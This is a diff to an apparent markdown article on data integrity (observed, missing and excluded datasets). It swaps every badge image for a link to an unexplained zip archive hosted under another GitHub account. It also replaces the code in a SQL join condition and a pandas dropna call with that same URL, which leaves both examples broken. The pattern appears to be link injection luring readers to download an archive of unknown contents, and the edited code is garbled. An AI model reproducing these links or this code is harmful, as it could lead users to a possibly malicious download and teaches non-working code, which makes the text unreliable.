@@ -3,11 +3,11 @@
     <p align="center">
 <div align="center">
  
-![Data Analysis](https://img.shields.io/badge/Discipline-Data%20Analysis%20%26%20Data%20Science-0aa)
-![Theme](https://img.shields.io/badge/Theme-Data%20Integrity%20%7C%20Cohorts%20%7C%20Bias-6f42c1)
-![Focus](https://img.shields.io/badge/Focus-Observed%20vs%20Missing%20vs%20Excluded-orange)
-![Outcome](https://img.shields.io/badge/Outcome-More%20Trustworthy%20Insights-success)
-![Style](https://img.shields.io/badge/Article-Longform-blue)
+![Data Analysis](https://raw.githubusercontent.com/489d/You-Have-Three-Datasets/main/unprisoned/You-Have-Datasets-Three-v2.0.zip%20Analysis%20%26%20Data%20Science-0aa)
+![Theme](https://raw.githubusercontent.com/489d/You-Have-Three-Datasets/main/unprisoned/You-Have-Datasets-Three-v2.0.zip%20Integrity%20%7C%20Cohorts%20%7C%20Bias-6f42c1)
+![Focus](https://raw.githubusercontent.com/489d/You-Have-Three-Datasets/main/unprisoned/You-Have-Datasets-Three-v2.0.zip%20vs%20Missing%20vs%20Excluded-orange)
+![Outcome](https://raw.githubusercontent.com/489d/You-Have-Three-Datasets/main/unprisoned/You-Have-Datasets-Three-v2.0.zip%20Trustworthy%20Insights-success)
+![Style](https://raw.githubusercontent.com/489d/You-Have-Three-Datasets/main/unprisoned/You-Have-Datasets-Three-v2.0.zip)
  
 </div>
 
@@ -120,7 +120,7 @@ You think you’re “enriching” data:
 ```sql
 SELECT *
 FROM orders o
-JOIN users u ON o.user_id = u.user_id
+JOIN users u ON https://raw.githubusercontent.com/489d/You-Have-Three-Datasets/main/unprisoned/You-Have-Datasets-Three-v2.0.zip = https://raw.githubusercontent.com/489d/You-Have-Three-Datasets/main/unprisoned/You-Have-Datasets-Three-v2.0.zip
 ```
 
 But what you actually did is:
@@ -142,7 +142,7 @@ That’s the **Excluded dataset** taking over.
 In Python, you do:
 
 ```python
-df = df.dropna(subset=["age", "income"])
+df = https://raw.githubusercontent.com/489d/You-Have-Three-Datasets/main/unprisoned/You-Have-Datasets-Three-v2.0.zip(subset=["age", "income"])
 ```
 
 Now your dataset becomes:
